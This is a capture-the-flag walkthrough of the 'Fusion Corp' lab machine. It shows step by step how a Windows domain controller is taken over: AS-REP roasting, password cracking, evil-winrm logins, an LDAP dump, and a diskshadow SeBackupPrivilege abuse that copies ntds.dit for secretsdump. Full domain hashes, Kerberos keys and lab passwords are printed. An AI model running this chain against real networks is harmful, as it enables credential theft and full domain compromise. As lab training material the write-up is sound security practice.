FUSION CORP
===========



Start with nmap scan 

```bash
# Nmap 7.91 scan initiated Mon Jun 21 14:41:27 2021 as: nmap --min-rate 300 -sC -sV -A -oN initial 10.10.190.242
Nmap scan report for 10.10.190.242 (10.10.190.242)
Host is up (0.15s latency).
Not shown: 987 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: eBusiness Bootstrap Template
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-21 09:13:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2021-06-21T09:13:10+00:00
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2021-03-02T19:26:49
|_Not valid after:  2021-09-01T19:26:49
|_ssl-date: 2021-06-21T09:13:50+00:00; +1m21s from scanner time.
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1m20s, deviation: 0s, median: 1m20s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-06-21T09:13:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 21 14:42:33 2021 -- 1 IP address (1 host up) scanned in 65.80 seconds

```

## User 1

Web server is running there is also kerberos server, Run gobuster/dirbuster on website and look for directories.

![gobuster](/Images/fusioncorp/gobuster.png)

and we found employee details in **backup** directory.

![employee](/Images/fusioncorp/employee.png)

we have username of some of the users, save those users name in `users.txt` then we use one of the impacket tool.

`GetNPUsers.py 'fusion.corp/' -usersfile users.txt -no-pass -dc-ip fusion.corp`

![kerberos-hash](/Images/fusioncorp/kerberos-hash.png)

found one valid user with kerberos hash, now crack the password with **John** or **Hashcat**.

![John the Ripper](/Images/fusioncorp/john.png)

cracked password is `!!abbylvzsvs2k6!` for user `lparker`

Now login using **evil-winrm** username and password 

`evil-winrm -i fusion.corp -u lparker -p '!!abbylvzsvs2k6!'`

![User1-Flag](/Images/fusioncorp/user1.png) 

## User 2 

Dumping LDAP with creds we got

`ldapdomaindump fusion.corp -u 'fusion.corp\lparker' -p '!!abbylvzsvs2k6!' --no-json --no-grep`

![LDAP-Dump](/Images/fusioncorp/ldapdump.png)

when we look at the dumped file we find another user password

![Dump-User](/Images/fusioncorp/domain-users.png)

login with those creds and get 2nd flag

`evil-winrm -i fusion.corp -u jmurphy -p 'u8WC3!kLsgw=#bRY'`

![User2-Flag](/Images/fusioncorp/user2.png)


## User 3 (Administrator) 

**jmurphy** have backup privilege we can abuse this.

need to download these dll on you PC 1st [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll), [SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll)

1. Create folder

```bash
*Evil-WinRM* PS C:\> mkdir c:\tmp
```

2. create file name `diskshadow.txt` and add this

```
set context persistent nowriters #
set metadata c:\tmp\metadata.cab #
add volume c: alias myAlias #
create #
expose %myAlias% x: #
exec "cmd.exe" /c copy x:\windows\ntds\ntds.dit c:\tmp\ntds.dit #
delete shadows volume %myAlias% #
reset #

```

3. upload the downloaded dll files and diskshadow.txt file

```bash
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> upload diskshadow.txt
```

4. run the **diskshadow.txt** file, you can download text file [here.](https://github.com/codebycamk/DiskShadowCopyNtds)

![Diskshadow](/Images/fusioncorp/diskshadow.png)

5. Import the uploaded dll modules

```bash
*Evil-WinRM* PS C:\tmp> Import-Module .\SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> Import-Module .\SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> Set-SeBackupPrivilege
```

6. Copy the **SYSTEM** file and **NTDS.dit** to `c:\tmp` and download it to your PC

![download](/Images/fusioncorp/download.png)

7. Using Impacket-Secretdump.py get all hasher and login as `Administrator` and get final flag.

```bash
└─$ secretsdump.py -system system -ntds ntds.dit LOCAL
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 76cf6bbf02e743fac12666e5a41342a7
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9653b02d945329c7270525c4c2a69c67:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
FUSION-DC$:1000:aad3b435b51404eeaad3b435b51404ee:06dad9b238c644fdc20c7633b82a72c6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:feabe44b40ad2341cdef1fd95297ef38:::
fusion.corp\lparker:1103:aad3b435b51404eeaad3b435b51404ee:5a2ed7b4bb2cd206cc884319b97b6ce8:::
fusion.corp\jmurphy:1104:aad3b435b51404eeaad3b435b51404ee:69c62e471cf61441bb80c5af410a17a3:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:4db79e601e451bea7bb01d0a8a1b5d2950992b3d2e3e750ab1f3c93f2110a2e1
Administrator:aes128-cts-hmac-sha1-96:c0006e6cbd625c775cb9971c711d6ea8
Administrator:des-cbc-md5:d64f8c131997a42a
FUSION-DC$:aes256-cts-hmac-sha1-96:3512e0b58927d24c67b6d64f3d1b71e392b7d3465ae8e9a9bc21158e53a75088
FUSION-DC$:aes128-cts-hmac-sha1-96:70a93c812e563eb869ba00bcd892f76a
FUSION-DC$:des-cbc-md5:04b9ef07d9e0a279
krbtgt:aes256-cts-hmac-sha1-96:82e655601984d4d9d3fee50c9809c3a953a584a5949c6e82e5626340df2371ad
krbtgt:aes128-cts-hmac-sha1-96:63bf9a2734e81f83ed6ccb1a8982882c
krbtgt:des-cbc-md5:167a91b383cb104a
fusion.corp\lparker:aes256-cts-hmac-sha1-96:4c3daa8ed0c9f262289be9af7e35aeefe0f1e63458685c0130ef551b9a45e19a
fusion.corp\lparker:aes128-cts-hmac-sha1-96:4e918d7516a7fb9d17824f21a662a9dd
fusion.corp\lparker:des-cbc-md5:7c154cb3bf46d904
fusion.corp\jmurphy:aes256-cts-hmac-sha1-96:7f08daa9702156b2ad2438c272f73457f1dadfcb3837ab6a92d90b409d6f3150
fusion.corp\jmurphy:aes128-cts-hmac-sha1-96:c757288dab94bf7d0d26e88b7a16b3f0
fusion.corp\jmurphy:des-cbc-md5:5e64c22554988937
[*] Cleaning up... 

```

![User3-Flag](/Images/fusioncorp/user3.png)
